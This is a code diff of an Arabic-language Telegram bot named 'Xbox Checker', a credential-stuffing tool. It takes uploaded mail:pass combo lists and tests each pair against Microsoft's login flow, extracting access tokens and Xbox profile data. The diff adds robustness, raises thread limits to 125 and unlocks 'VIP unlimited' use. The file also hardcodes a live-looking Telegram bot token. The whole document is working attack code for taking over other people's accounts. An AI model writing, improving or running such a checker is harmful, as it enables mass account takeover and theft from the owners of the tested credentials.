@@ -12,11 +12,11 @@ from http.server import HTTPServer, BaseHTTPRequestHandler
 
 urllib3.disable_warnings()
 
-# التوكن الجديد الخاص بك
+# التوكن الخاص بك
 BOT_TOKEN = "8920692173:AAFQPb5rqonlngMmha9EEN7QktgDazml78Y"
 
 bot = telebot.TeleBot(BOT_TOKEN)
-_TIMEOUT = (8, 10)
+_TIMEOUT = (10, 15)
 
 busy_users = set()
 active_scans = {}
@@ -40,11 +40,11 @@ threading.Thread(target=run_web_server, daemon=True).start()
 
 TRANSLATIONS = {
     "ar": {
-        "welcome": "# WELCOME TO {bot_name} #\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n– 📬 أرسل ملف الكومبو الخاص بك (.txt)\n︙ التنسيق: mail:pass (سطر لكل حساب)\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n– 📊 لوحة التحكم الخاصة بك:\n︙ الثريدز: {threads} / {max_threads}\n︙ الخطة: {plan}\n︙ الأيام المتبقية: –\n︙ الحد اليومي: 5268 / 5851 سطر\n︙ الوضع: 🎮 {mode}\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n– ◎ اختر خياراً من القائمة أدناه:",
+        "welcome": "# WELCOME TO {bot_name} #\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n– 📬 أرسل ملف الكومبو الخاص بك (.txt)\n︙ التنسيق: mail:pass (سطر لكل حساب)\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n– 📊 لوحة التحكم الخاصة بك:\n︙ الثريدز: {threads} / {max_threads}\n︙ الخطة: {plan}\n︙ الأيام المتبقية: ∞ (مدى الحياة)\n︙ الحد اليومي: غير محدود (Unlimited)\n︙ الوضع: 🎮 {mode}\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n– ◎ اختر خياراً من القائمة أدناه:",
         "settings_title": "⚙️ **إعدادات البوت**",
-        "threads_title": "# 🧵 تعيين عدد الثريدز #\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\nالحدود حسب خطتك:\n- مجاني (FREE): 1-50\n- أساسي (BASIC): 1-75\n- مميز (VIP): 1-125\n\nخطتك الحالية ({plan}) تتيح لك حتى {max_threads} ثريد.\nأرسل رقماً بين 1 و {max_threads}.",
+        "threads_title": "# 🧵 تعيين عدد الثريدز #\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\nالحدود حسب خطتك:\n- مميز (VIP): 1-125\n\nخطتك الحالية ({plan}) تتيح لك حتى {max_threads} ثريد.\nأرسل رقماً بين 1 و {max_threads}.",
         "stats": "📊 إحصائياتك: لا توجد عمليات فحص سابقة مسجلة.",
-        "membership_msg": "💎 خطتك الحالية هي: {plan}",
+        "membership_msg": "💎 خطتك الحالية هي: {plan} (غير محدودة)",
         "changed_lang": "✅ تم تغيير اللغة إلى: العربية",
         
         "btn_stats": "📊 الإحصائيات",
@@ -68,10 +68,10 @@ def get_user_config(chat_id):
     if chat_id not in user_settings:
         user_settings[chat_id] = {
             "bot_name": "Xbox Checker",
-            "threads": 50,
-            "max_threads": 50,
+            "threads": 125,
+            "max_threads": 125,
             "mode": "Xbox",
-            "plan": "🆓 FREE",
+            "plan": "💎 VIP (Unlimited)",
             "lang": "ar",
             "link_mode": False,
             "channel_send": False,
@@ -95,22 +95,25 @@ class XboxChecker:
         return s
 
     def _extract_token(self, url):
-        fragment = urlparse(url).fragment
-        if not fragment and "#" in url:
-            fragment = url.split("#", 1)[1]
-        params = parse_qs(fragment)
-        return params.get("access_token", [None])[0]
+        try:
+            fragment = urlparse(url).fragment
+            if not fragment and "#" in url:
+                fragment = url.split("#", 1)[1]
+            params = parse_qs(fragment)
+            return params.get("access_token", [None])[0]
+        except:
+            return None
 
     def check(self, email, password):
         try:
             session = self._session()
             r1 = session.get(self.LOGIN_URL, timeout=_TIMEOUT)
-            sftag_m = re.search(r'value=\\"(.+?)\\"', r1.text)
+            sftag_m = re.search(r'value="(.+?)"', r1.text) or re.search(r'value=\\"(.+?)\\"', r1.text)
             url_post_m = re.search(r'"urlPost":"(.+?)"', r1.text)
             if not sftag_m or not url_post_m:
                 return {"status": "BAD"}
             sftag = sftag_m.group(1)
-            url_post = url_post_m.group(1)
+            url_post = url_post_m.group(1).replace("\\/", "/")
 
             r2 = session.post(
                 url_post,
@@ -120,18 +123,18 @@ class XboxChecker:
             )
 
             ms_token = None
-            if "access_token" in r2.url:
+            if r2 and "access_token" in r2.url:
                 ms_token = self._extract_token(r2.url)
             else:
-                r2_lower = r2.text.lower()
-                if any(x in r2_lower for x in ["incorrect account", "password is incorrect", "doesn't exist", "no account found"]) or re.search(r'sErrorCode.*?"50126"', r2.text):
+                r2_lower = r2.text.lower() if r2 else ""
+                if any(x in r2_lower for x in ["incorrect account", "password is incorrect", "doesn't exist", "no account found"]) or (r2 and re.search(r'sErrorCode.*?"50126"', r2.text)):
                     return {"status": "BAD"}
-                if "identity/confirm" in r2.url or "two-step verification" in r2_lower:
+                if r2 and ("identity/confirm" in r2.url or "two-step verification" in r2_lower):
                     return {"status": "2FA"}
-                if "/Abuse" in r2.url or "suspended" in r2_lower:
+                if r2 and ("/Abuse" in r2.url or "suspended" in r2_lower):
                     return {"status": "BAD"}
 
-                form_action_m = re.search(r'<form[^>]*action="([^"]+)"', r2.text)
+                form_action_m = re.search(r'<form[^>]*action="([^"]+)"', r2.text) if r2 else None
                 if form_action_m:
                     action = form_action_m.group(1)
                     hidden = {}
@@ -143,7 +146,7 @@ class XboxChecker:
                             if n:
                                 hidden[n.group(1)] = v.group(1) if v else ""
                     r3 = session.post(action, data=hidden, timeout=_TIMEOUT, allow_redirects=True)
-                    if "access_token" in r3.url:
+                    if r3 and "access_token" in r3.url:
                         ms_token = self._extract_token(r3.url)
 
                 if not ms_token:
@@ -158,7 +161,7 @@ class XboxChecker:
                 },
                 timeout=_TIMEOUT,
             )
-            if r_xbl.status_code != 200:
+            if not r_xbl or r_xbl.status_code != 200:
                 return {"status": "FREE", "data": {}}
             
             xbl_data = r_xbl.json()
@@ -177,7 +180,7 @@ class XboxChecker:
             
             gamertag = ""
             gamerscore = 0
-            if r_xsts.status_code == 200:
+            if r_xsts and r_xsts.status_code == 200:
                 xsts_token = r_xsts.json()["Token"]
                 xbl_auth = f"XBL3.0 x={uhs};{xsts_token}"
                 r_prof = session.get(
@@ -185,7 +188,7 @@ class XboxChecker:
                     headers={"Authorization": xbl_auth, "x-xbl-contract-version": "2"},
                     timeout=_TIMEOUT,
                 )
-                if r_prof.status_code == 200:
+                if r_prof and r_prof.status_code == 200:
                     settings = r_prof.json().get("profileUsers", [{}])[0].get("settings", [])
                     for s in settings:
                         if s.get("id") == "Gamertag":
@@ -199,7 +202,7 @@ class XboxChecker:
             data = {"gamertag": gamertag, "gamerscore": gamerscore}
             return {"status": "FREE", "data": data}
 
-        except Exception:
+        except Exception as e:
             return {"status": "BAD"}
 
 
@@ -240,12 +243,22 @@ def send_welcome(message):
     send_main_menu(message.chat.id)
 
 
+@bot.message_handler(commands=['queue'])
+def check_queue(message):
+    chat_id = message.chat.id
+    if chat_id in active_scans:
+        scan = active_scans[chat_id]
+        bot.reply_to(message, f"📊 حالة الفحص: {scan['checked']} / {scan['total']}")
+    else:
+        bot.reply_to(message, "⚠️ لا توجد عملية فحص جارية حالياً.")
+
+
 @bot.message_handler(commands=['stop'])
 def stop_checker(message):
     chat_id = message.chat.id
-    if chat_id in busy_users and chat_id in active_scans:
+    if chat_id in active_scans:
         active_scans[chat_id]["stop"] = True
-        bot.reply_to(message, "🛑 جاري إيقاف الفحص...")
+        bot.reply_to(message, "🛑 جاري إيقاف الفحص وإرسال النتائج...")
     else:
         bot.reply_to(message, "⚠️ لا توجد عملية فحص جارية حالياً.")
 
@@ -256,6 +269,7 @@ def handle_file(message):
     
     with file_lock:
         if chat_id in busy_users:
+            bot.reply_to(message, "⚠️ لديك عملية فحص تعمل بالفعل، انتظر حتى تنتهي أو قم بإيقافها.")
             return
         busy_users.add(chat_id)
 
@@ -313,11 +327,13 @@ def handle_file(message):
         lock = threading.Lock()
 
         def process_combo(email, password):
-            if active_scans.get(chat_id, {}).get("stop", False):
+            if chat_id not in active_scans or active_scans[chat_id]["stop"]:
                 return
+            
             result = checker.check(email, password)
+            
             with lock:
-                if active_scans.get(chat_id, {}).get("stop", False):
+                if chat_id not in active_scans:
                     return
                 active_scans[chat_id]["checked"] += 1
                 checked = active_scans[chat_id]["checked"]
@@ -334,7 +350,7 @@ def handle_file(message):
                 else:
                     active_scans[chat_id]["error"] += 1
 
-                if checked % 25 == 0 or checked == total:
+                if checked % 10 == 0 or checked == total:
                     try:
                         scan_d = active_scans[chat_id]
                         bot.edit_message_text(
@@ -360,11 +376,11 @@ def handle_file(message):
         with ThreadPoolExecutor(max_workers=max_workers) as executor:
             futures = [executor.submit(process_combo, p[0], p[1]) for p in combos]
             for f in as_completed(futures):
-                if active_scans.get(chat_id, {}).get("stop", False):
+                if chat_id not in active_scans or active_scans[chat_id]["stop"]:
                     break
 
         elapsed_time = max(int(time.time() - start_time), 1)
-        scan_data = active_scans.get(chat_id, {})
+        scan_data = active_scans.get(chat_id, {"checked": 0, "hits": 0, "free": 0, "two_fa": 0, "bad": 0, "error": 0})
         cpm = int((scan_data["checked"] / elapsed_time) * 60)
 
         report = (
@@ -395,7 +411,7 @@ def handle_file(message):
             bot.send_message(chat_id, report, parse_mode="Markdown")
 
     except Exception as e:
-        bot.reply_to(message, f"حدث خطأ: {e}")
+        bot.reply_to(message, f"حدث خطأ في النظام: {e}")
     finally:
         busy_users.discard(chat_id)
         active_scans.pop(chat_id, None)
@@ -407,8 +423,10 @@ def stop_scan_callback(call):
     if chat_id in active_scans:
         active_scans[chat_id]["stop"] = True
         bot.answer_callback_query(call.id, "🛑 تم إيقاف الفحص.")
+    else:
+        bot.answer_callback_query(call.id, "⚠️ لا يوجد فحص نشط حالياً.")
 
 
 if __name__ == "__main__":
-    print("Bot is running with full features...")
+    print("Bot is running with full VIP & Unlimited features...")
     bot.infinity_polling()
